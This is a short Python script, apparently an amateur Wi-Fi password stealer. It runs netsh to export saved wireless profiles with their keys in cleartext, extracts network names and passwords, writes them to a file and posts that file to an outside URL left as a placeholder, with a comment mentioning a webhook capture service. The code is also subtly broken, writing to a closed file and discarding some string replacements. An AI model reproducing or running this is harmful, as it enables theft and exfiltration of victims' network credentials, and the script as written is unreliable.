import subprocess
import os
import requests
# Create a file
passwords = open('passwords.txt', 'w')
passwords.write("Passwards:\n\n")
passwords.close()

# make the url (I used webhooks.site to test http request code)
url = "your url here"

# Use python to run command line scripts
command = subprocess.run(["netsh", "wlan", "export", "profile",
                          "key=clear"], capture_output = True).stdout.decode()

# get the path
path = os.getcwd()  # get current working dir

for file in os.listdir(path):  # same as ls and loops through each file
    if file.startswith("Wi-Fi") and file.endswith(".xml"):
        passwords.write(file)
        with open(file, "r") as data:
            for line in data:
                if "name" in line:
                    line.replace("<name>", "")
                    line.replace("</name>", "")
                    wifi_ssid = line
                    passwords.write(line)
                if "keyMaterial" in line:
                    line = line.replace("<keyMaterial>", "")
                    line = line.replace("</keyMaterial>", "")
                    line = line.strip()
                    wifi_pass = line
                    passwords.write(line)
                    passwords.write("\n")


def main():
    with open('passwords.txt', "rb") as f:
        r = requests.post(url, data=f)


if __name__ == "__main__":
    main()
